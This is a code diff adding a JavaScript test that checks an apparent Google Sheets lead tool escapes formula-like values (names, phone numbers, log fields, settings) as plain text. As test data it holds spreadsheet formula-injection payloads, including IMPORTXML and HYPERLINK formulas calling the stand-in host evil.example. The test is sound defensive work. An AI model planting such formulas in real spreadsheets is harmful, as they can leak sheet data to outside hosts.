@@ -126,3 +126,18 @@ test("reply search covers only the given clients, in all mail, a few at a time",
   assert.deepEqual(found.map((m) => m.from), ["Priya <priya@example.com>"]);
   assert.equal(env.gmail.remainingQuota(), 87);
 });
+
+test("anything that looks like a formula is saved as plain text", () => {
+  const { env, sheets } = fakeGoogle();
+  env.sheet.writeLeadRows([leadRow({ name: '=IMPORTXML("https://evil.example","//a")', phone: "+1 647 555 0123" })]);
+  const row = sheets.Clients.cells[1];
+  assert.equal(row[4], `'=IMPORTXML("https://evil.example","//a")`);
+  assert.equal(row[6], "'+1 647 555 0123");
+  assert.ok(row[16].startsWith("{"));
+  env.sheet.appendLog([["2026-10-26 14:32", "-x", '@SUM(A1) =HYPERLINK("https://evil.example")']]);
+  const log = sheets.Log.cells[sheets.Log.getLastRow() - 1];
+  assert.equal(log[1], "'-x");
+  assert.equal(log[2], `'@SUM(A1) =HYPERLINK("https://evil.example")`);
+  env.sheet.writeSettingValue("Last error", "=1+1");
+  assert.equal(env.sheet.readSettingsRows().find((r) => r[0] === "Last error")[1], "'=1+1");
+});
